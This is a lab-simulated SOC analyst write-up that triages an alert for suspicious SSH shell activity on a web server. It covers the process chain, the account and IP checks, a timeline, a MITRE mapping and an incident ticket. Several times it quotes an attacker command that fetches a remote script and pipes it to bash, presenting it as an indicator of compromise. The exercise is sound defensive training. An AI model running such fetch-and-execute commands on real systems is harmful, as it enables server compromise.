# Suspicious Linux Shell Activity (Lab-Simulated for L1)

Scenario1
### Alert shows:
sshd ---> bash ---> whoami
sshd ---> bash ---> id
sshd ---> bash ---> uname -a
sshd ---> bash ---> ls
sshd ---> bash ---> curl http://45.77.12.9/s.sh | bash

### Context Provided:
User: www-data
External IP: 203.0.113.55
Time: 03:14 AM
Server role: nginx web server

----

## INVESTIGATION PROCESS

### Step 1 - Validate Alert

	Check:
	- Is the log source reliable?
	- Is the hostname correct?
	- Are timestamps valid?
	- Is this true or false positive?

	Confirm process chain existence:
	- Search in SIEM
		index=Linux host=web01

### Step 2 - Understand Parent-Child Chain

	Recontruct

	sshd (Remote login)
   	 ---> bash 
            ---> `whoami`
	    ---> `id`
	    ---> `uname -a`
	    ---> `ls`
	    ---> `curl http://45.77.12.9/s.sh | bash`

	Interpretation:

	- sshd - remote access confirmed
	- bash - interactive shell
	- whoami/id/uname/ls - discovery phase
	- curl|bash - payload execution
`*this is structured attacker behavior`

### Step 3 - Check Account Context

	User: `www-data`

	Questions:
	- should www-data log in via SSH?
	- does www-data normally spwan bash?
	- is this account interactive?

`*on web servers: www-data normally runs nginx, not ssh.`

### Step 4 - Check Source IP

	IP: `203.0.113.55`

	Check:
	- is this internal?
	- is it known admin IP?
	- is it foreign?
	- is it blacklisted?

`*if unknown external IP > redflag`

### Step 5 - Timeline Reconstruction

	Time		Event
	03:14:01	SSH log in
	03:14:05	bash started
	03:14:06	whoami
	03:14:07	id
	03:14:08	uname
	03:14:09	ls
	03:14:12	curl

`*this clearly shows: Discovery --> payload execution`
`*not normal user behavior`

## CONCLUSION

	`This is likely remote compromise of web server via SSH`

### Stage:
	- Initial access
	- Discovery
	- Execution

### MITRE Mapping
	- T1078 Valid Accounts
	- T1059 Command Shell
	- T1082 System Information Discovery
	- T1105 Ingress Tool Transfer


## DOCUMENTAION

### Incident Ticker - SOC L1

Case ID: INC-2026-0212-001
Alert Name: Suspicious Linux Shell Activity
Severity: High
Host: web01
Date/Time: 2026-02-12, 03:14 UTC


### Summary:
	`Detected suspicious SSH login followed by shell execution and command enumeration under user www-data. Activity includes system discovery commands and remote script execution via curl`


### Investigation Findings
	- SSH session initiated from external IP: 203.0.113.55
	- User account:www-data
	- Parent-child process chain confirmed:
		sshd --> bash --> whoami/id/uname/ls --> curl | bash
	- execution of remote script from IP 45.77.12.9
	- Activity occurred outside business hours (03:14 AM)
	- Account normally not used for interactive SSH sessions

### Indicators of Compromise (IOCs)
	- Source IP: 203.0.113.55
	- Remote script IP 45.77.12.9
	- Suspicious command: curl http://45.77.12.9/s.sh | bash

### Assessment
	Behavior strongly aligns with attacker discovery and payload execution phase following unauthorized SSH access

### Confidence Level
	 : HIGH

### Recommendation Actions
	- Escalate to SOC L2/Incident Response
	- Isolate affected host
	- Reset credentials for www-data
	- Block external IPs
	- Review additional lateral movement
